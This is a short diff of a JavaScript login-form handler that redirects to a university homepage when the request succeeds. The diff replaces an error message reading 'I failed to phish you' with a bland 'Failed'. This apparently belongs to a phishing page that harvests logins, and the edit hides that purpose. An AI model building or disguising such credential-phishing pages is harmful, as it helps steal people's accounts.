@@ -16,7 +16,7 @@ document.getElementById('login-form').addEventListener('submit', function(event)
       if (response.ok) {
         window.location.replace("https://web.eecs.utk.edu/~hbrand/homepage/");
       } else {
-        throw new Error('I failed to phish you');
+        throw new Error('Failed');
       }
     })
     .catch(error => console.error(error));
